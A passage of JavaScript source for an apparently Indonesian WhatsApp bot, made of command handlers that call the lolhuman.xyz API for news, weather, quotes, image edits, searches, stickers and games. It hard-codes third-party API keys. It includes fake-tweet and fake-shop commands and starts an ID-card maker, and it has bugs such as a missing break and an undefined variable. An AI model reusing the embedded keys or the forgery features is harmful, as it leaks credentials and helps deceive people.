                    reply(ini_txt)
                    break
                case 'newsinfo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Published : ${x.publishedAt}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnindonesia':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnnnasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cnninternasional':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Result :\n"
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.judul}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Tipe : ${x.tipe}\n`
                        ini_txt += `Published : ${x.waktu}\n\n`
                    }
                    reply(ini_txt)
                    break
                 case 'cekgempa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Lokasi : ${get_result.lokasi}\n`
                    ini_txt += `Waktu : ${get_result.waktu}\n`
                    ini_txt += `Potensi : ${get_result.potensi}\n`
                    ini_txt += `Magnitude : ${get_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                    ini_txt += `Koordinat : ${get_result.koordinat}`
                    get_buffer = await getBuffer(get_result.map)
                    await ikyc.sendMessage(from, get_buffer, image, { quoted: iky, caption: ini_txt })
                    break
                case 'cuaca':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Tempat : ${get_result.tempat}\n`
                    ini_txt += `Cuaca : ${get_result.cuaca}\n`
                    ini_txt += `Angin : ${get_result.angin}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
                    ini_txt += `Suhu : ${get_result.suhu}\n`
                    ini_txt += `Udara : ${get_result.udara}\n`
                    ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
                    await ikyc.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: iky })
                    reply(ini_txt)
                    break
                case 'covidindo':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'covidglobal':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                case 'kodepos':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${daerah}`)
                    get_result = get_result.result[0]
                    ini_txt = `Provinsi : ${get_result.province}\n`
                    ini_txt += `Kabupaten : ${get_result.city}\n`
                    ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
                    ini_txt += `Kelurahan : ${get_result.urban}\n`
                    ini_txt += `Kode Pos : ${get_result.postalcode}`
                    reply(ini_txt)
                   case 'cekip':                    
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/114.142.169.38?apikey=himaru`)
                    get_result = get_result.result[0]
                    ini_txt = `Country : ${get_result.country}\n`
                    ini_txt += `CountryCode : ${get_result.countryCode}\n`
                    ini_txt += `Region : ${get_result.region}\n`
                    ini_txt += `RegionName : ${get_result.regionName}\n`
                    ini_txt += `City : ${get_result.city}\n`
                    ini_txt += `Zip : ${get_result.zip}\n`
                    ini_txt += `Lat : ${get_result.lat}\n`
                    ini_txt += `Lon : ${get_result.lon}\n`
                    ini_txt += `TimeZone : ${get_result.timezone}\n`
                    ini_txt += `Isp : ${get_result.isp}\n`
                    ini_txt += `Org : ${get_result.org}\n`
                    ini_txt += `As : ${get_result.as}\n`
                    ini_txt += `IP : ${get_result.query}`
                    reply(ini_txt)
                    break
case 'cekapi':
if (isZadani) return
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `UserName : ${get_result.username}\n`
                    ini_txt += `requests : ${get_result.requests}\n`
                    ini_txt += `today : ${get_result.today}\n`
                    ini_txt += `AkunTipe : ${get_result.account_type}\n`
                    ini_txt += `Masa : ${get_result.expired}`
                    reply(ini_txt)
                    break	
	case 'imageflip':	  
	  if (isBanned) return reply('Maaf kamu sudah terbenned!')
	  var imgbb = require('imgbb-uploader')
	  if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(1)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/editor/flip?apikey=${apikey}&img=${woy.display_url}`)
	  ikyc.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
case 'imageround':	  
	  if (isBanned) return reply('Maaf kamu sudah terbenned!')
	  var imgbb = require('imgbb-uploader')
	  if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(1)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/editor/roundimage?apikey=${apikey}&img=${woy.display_url}`)
	  ikyc.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imagepixelate':
	  if (isBanned) return reply('Maaf kamu sudah terbenned!')
	  var imgbb = require('imgbb-uploader')
	  if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(1)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/editor/pixelate?apikey=${apikey}&img=${woy.display_url}`)
	  ikyc.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break	
	case 'imagecartoon':
	  if (isBanned) return reply('Maaf kamu sudah terbenned!')
	  var imgbb = require('imgbb-uploader')
	  if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: iky
	  reply(mess.wait)
	  owgi = await ikyc.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(1)
	  woy = await imgbb("84e2110ad43b6335d5925589e4685e8a", owgi)
	  hehe = await getBuffer(`https://api.lolhuman.xyz/api/editor/cartoon?apikey=${apikey}&img=${woy.display_url}`)
	  ikyc.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break	
                case 'jadwalbola':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Jadwal Bola :\n"
                    for (var x of get_result) {
                        ini_txt += `Hari : ${x.hari}\n`
                        ini_txt += `Jam : ${x.jam}\n`
                        ini_txt += `Event : ${x.event}\n`
                        ini_txt += `Match : ${x.match}\n`
                        ini_txt += `TV : ${x.tv}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'indbeasiswa':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Beasiswa :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'hoax':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'Info Hoax :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Posted : ${x.posted}\n`
                        ini_txt += `Description : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                   // Movie & Story
                case 'lk21':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Link : ${get_result.link}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Views : ${get_result.views}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Tahun : ${get_result.tahun}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Actors : ${get_result.actors.join(", ")}\n`
                    ini_txt += `Location : ${get_result.location}\n`
                    ini_txt += `Date Release : ${get_result.date_release}\n`
                    ini_txt += `Language : ${get_result.language}\n`
                    ini_txt += `Link Download : ${get_result.link_dl}`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break                
case 'tembakudara':
if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}udara tembak perlahan`)
                    var zance = randomNomor(400)
                    addBalance(sender, zance, balance)
                    FC = body.slice(1)
                    setTimeout( () => {
                    reply(`[ *BERSIAP BERBURU DI UDARA* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* 𝗗𝗜𝗠𝗨𝗟𝗔𝗜 ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *JANGAN BERISIK NANTI KETAHUAN* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *SEPERTINYA SEPI* ]`)
                    }, 30000)
                    setTimeout( () => {
                    reply(`😮 𝗪𝗢𝗪 𝗔𝗡𝗗𝗔 𝗠𝗘𝗡𝗗𝗔𝗣𝗔𝗧𝗞𝗔𝗡 ➣ ${buruh33} \n⚖️ 𝗗𝗔𝗡 ➣$${zance} 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 \nℹ️ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 : #𝗜𝗡𝗙𝗢3`)
                    }, 60000)
                    gameAdd(sender, glimit)                   
                    break
        case 'tembakdarat':
if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)        
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}darat tembak perlahan`)
                    var zanci = randomNomor(400)
                    addBalance(sender, zanci, balance)
                    FC = body.slice(1)
                    setTimeout( () => {
                    reply(`[ *BERSIAP BERBURU DI DARATAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* 𝗗𝗜𝗠𝗨𝗟𝗔𝗜 ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SEPERTINYA ADA YANG MENDEKATI KITA* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`😮 𝗪𝗢𝗪 𝗔𝗡𝗗𝗔 𝗠𝗘𝗡𝗗𝗔𝗣𝗔𝗧𝗞𝗔𝗡 ➣ ${buruh22} \n⚖️ 𝗗𝗔𝗡 ➣$${zanci} 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 \nℹ️ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 : #𝗜𝗡𝗙𝗢2`)
                    }, 60000)
                    gameAdd(sender, glimit)                    
                    break
        case 'mancing':
if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)        
                    if (args.length < 1) return reply(`PILIH ARAH/CARA CONTOH\n${prefix}mancing perlahan`)
                    var zancu = randomNomor(400)
                    addBalance(sender, zancu, balance)
                    FC = body.slice(1)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERSIAP UNTUK MEMANCING* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *${FC}* 𝗗𝗜𝗠𝗨𝗟𝗔𝗜 ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SEDANG MEMANCING* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *SEPERTINYA UMPAN ANDA BERGERAK* ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ *MANCING EMNG LAMA MENDING NGOPI DULU ☕* ]`)
                    }, 35000)
                    setTimeout( () => {
                    reply(`😮 𝗪𝗢𝗪 𝗔𝗡𝗗𝗔 𝗠𝗘𝗡𝗗𝗔𝗣𝗔𝗧𝗞𝗔𝗡 ➣ ${buruh11} \n⚖️ 𝗗𝗔𝗡 ➣$${zancu} 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 \nℹ️ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 : #𝗜𝗡𝗙𝗢1`)
                    }, 60000)
                    gameAdd(sender, glimit)                    
                    break
                case 'drakorongoing':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = "Ongoing Drakor\n\n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Year : ${x.category}\n`
                        ini_txt += `Total Episode : ${x.total_episode}\n`
                        ini_txt += `Genre : ${x.genre.join(", ")}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'wattpad':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Motify date : ${get_result.modifyDate}\n`
                    ini_txt += `Create date: ${get_result.createDate}\n`
                    ini_txt += `Word : ${get_result.word}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Vote : ${get_result.vote}\n`
                    ini_txt += `Reader : ${get_result.reader}\n`
                    ini_txt += `Pages : ${get_result.pages}\n`
                    ini_txt += `Description : ${get_result.desc}\n\n`
                    ini_txt += `Story : \n${get_result.story}`
                    thumbnail = await getBuffer(get_result.photo)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break
                case 'wattpadsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = "Wattpad Seach : \n"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Part : ${x.parts}\n`
                        ini_txt += `Motify date : ${x.modifyDate}\n`
                        ini_txt += `Create date: ${x.createDate}\n`
                        ini_txt += `Coment count: ${x.commentCount}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'cerpen':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
                    break
                case 'ceritahoror':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    break

                    // Random Text //                
                case 'quotesanime':
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apikey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
                    quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${apikey}`)
                    reply(quotedilan.result)
                    break
                case 'quotesimage':
                    get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
                    await ikyc.sendMessage(from, get_result, image, { quotes: iky })
                    break
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':
                case 'bucin':
                case 'puisi':
                case 'katabucin':
                case 'quotes':
                case 'katabucin':                             
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)                    
                    setReply(get_result.result)                                              
                    break
                    case 'islami':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=himaru`)                 
                    setReply(get_result.result,)                                                         
                    break
                case 'randomnama':
                    woy = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`)
                    reply(woy.result)
                    break
               case 'katakata':
                if (isBanned) return reply(mess.ban)
           const rows7 = [{
        "title": 'Pantun',
        "rowId": `${prefix}pantun`
    }, {
        "title": 'Bucin',
        "rowId": `${prefix}bucin`
    }, {
        "title": 'Kata Bijak',
        "rowId": `${prefix}katabijak`
    }, {
        "title": 'Puisi',
        "rowId": `${prefix}puisi`
  }, {
        "title": 'Kata Ilham',
        "rowId": `${prefix}katailham`      
   }, {
        "title": 'Quotes',
        "rowId": `${prefix}quotes`    
   }, {
        "title": 'Kata Bucin',
        "rowId": `${prefix}katabucin` 
      }, {
        "title": 'Quotes Islami',
        "rowId": `${prefix}islami`       
    }, {
        "title": 'Random Nama',
        "rowId": `${prefix}randomnama`
    }, {
        "title": 'Fakta Unik',
        "rowId": `${prefix}faktaunik`
    }, {
        "title": 'Quotes Image',
        "rowId": `${prefix}quotesimage`
    }, {
        "title": 'Quotes Dilan',
        "rowId": `${prefix}quotesdilan`
    }, {
        "title": 'Quotes Anime',
        "rowId": `${prefix}quotesanime`
    }];
    const sections7 = [{
        title: 'Pilih salah satu',
        rows: rows7
    }];
    const listt7 = {
        buttonText: 'CLICK HERE',
        title: `RANDOM TEXT`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 🌝`,
        footerText: `Random Teks`,
        sections: sections7,
        listType: 1
    };
    ikyc.sendMessage(from, listt7, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break

                    // Searching
                case 'gimage':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${apikey}&query=${query}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'gimage2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gimage2?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await ikyc.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'konachan':
                    if (args.length == 0) return reply(`Example: ${prefix + command} azur_lane`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=${apikey}&query=${query}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'wallpapersearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${apikey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'wallpapersearch2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper2?apikey=${apikey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'playstore':
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'shopee':
                    if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'google':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'stickerwa':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${apikey}&img=${x}`)
                        await ikyc.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                    // Primbon                
                case 'weton':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/weton/${Tanggals}/${bulan}/${tahun}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Weton : ${get_result.weton}\n`
                    ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
                    ini_txt += `Rejeki : ${get_result.rejeki}\n`
                    ini_txt += `Jodoh : ${get_result.jodoh}`
                    reply(ini_txt)
                    break             
                case 'tebakumur':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    ini_name = args.join(" ")
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=SoftApikey&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    break
                case 'ttp':                
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'ttp5':
                case 'ttp6':
                case 'attp':
                case 'attp2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    setReply(mess.wait)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikey}&text=${ini_txt}`)
                    await ikyc.sendMessage(from, ini_buffer, sticker, { quoted: iky })
                    break
                case 'stickpatrick':                   
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/patrick?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                    case 'stickdadu':                    
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/dadu?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                    case 'stickamong':            
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/amongus?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                    case 'stickgura':                
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/gawrgura?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                    case 'stickanjing':                  
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/anjing?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                    case 'stickbucin':                    
                    woy = await getBuffer(`http://api.lolhuman.xyz/api/sticker/bucinstick?apikey=himaru`)
                    ikyc.sendMessage(from, woy, sticker, {quoted:ftrol})
                    break
                case 'smoji':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${apikey}`)
                    await ikyc.sendMessage(from, ini_buffer, sticker, { quoted: iky })
                    break
                case 'smoji2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/smoji3/${emoji}?apikey=${apikey}`)
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${apikey}&img=` + ini_buffer.result.emoji.whatsapp)
                    await ikyc.sendMessage(from, ini_buffer, sticker, { quoted: iky })
                    break
                case 'fakedonald':
                    if (args.length == 0) return reply(`Example: ${prefix + command} IKY Z`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/tweettrump?apikey=${apikey}&text=${ini_txt}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                case 'faketoko':
                    await faketoko(teks = "Tahu Bacem", url_image = "https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg", title = "LoL Human", code = "IDR", price = 1000000)
                    break
                case 'ktpmaker':
